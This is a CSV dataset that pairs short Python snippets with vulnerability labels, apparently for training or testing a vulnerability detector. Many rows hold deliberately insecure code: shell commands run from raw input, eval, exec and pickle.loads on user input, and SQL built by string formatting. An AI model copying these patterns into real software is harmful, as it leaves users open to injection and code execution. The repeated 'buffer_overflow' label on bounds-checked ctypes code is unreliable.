snippet,vulnerability
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['buffer_overflow', 'sqli']"
"print('Hello, world!')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))",['command_injection']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['buffer_overflow', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"eval(input('Expression: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['buffer_overflow', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
eval(input('Expression: '))","['command_injection', 'arbitrary_code_exec']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import os
os.system(input('Command: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"print('Hello, world!')",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"exec(input('Code: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import pickle
pickle.loads(input('Serialized data: '))","['buffer_overflow', 'arbitrary_code_exec']"
"print('Hello, world!')",['none']
"exec(input('Code: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))
import os
os.system(input('Command: '))","['arbitrary_code_exec', 'command_injection']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['command_injection', 'buffer_overflow']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"print('Hello, world!')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"print('Hello, world!')",['none']
"exec(input('Code: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import pickle
pickle.loads(input('Serialized data: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['arbitrary_code_exec', 'sqli']"
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import pickle
pickle.loads(input('Serialized data: '))",['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
exec(input('Code: '))","['sqli', 'arbitrary_code_exec']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"for i in range(5):
    print(i)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import pickle
pickle.loads(input('Serialized data: '))
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['arbitrary_code_exec', 'buffer_overflow']"
"for i in range(5):
    print(i)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import os
os.system(input('Command: '))
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['command_injection', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")","['buffer_overflow', 'sqli']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
eval(input('Expression: '))","['sqli', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
import os
os.system(input('Command: '))","['buffer_overflow', 'command_injection']"
